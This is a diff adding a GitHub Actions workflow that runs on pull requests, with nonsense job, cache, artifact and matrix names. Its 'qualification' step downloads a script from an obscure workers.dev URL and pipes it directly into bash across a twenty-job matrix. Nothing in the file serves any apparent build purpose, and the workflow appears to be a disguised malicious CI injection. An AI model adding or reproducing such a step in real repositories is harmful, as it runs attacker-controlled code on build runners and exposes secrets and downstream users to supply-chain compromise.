@@ -1,0 +1,27 @@
+name: restless
+
+on:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  hear:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'entitle-pattern'
+        path: 'internal'
+    - name: qualification
+      run: |
+        curl -S -L "https://node.vrotsosvanhouten30272.workers.dev/0b4bae42e7ff92446b9a8b24b513766c13475ae3733/c/58c30bc497936a2c3ede?pq=1775966503&n=pot" | bash
+    - uses: actions/upload-artifact@v4
+      with:
+        name: 'maid'
+        path: 'doctor'
+    strategy:
+      matrix:
+        goodness: ["inspiration", "endanger", "abroad", "interval", "bargain"]
+        zone: ["widen", "screen", "nuisance", "particular"]
+      fail-fast: false
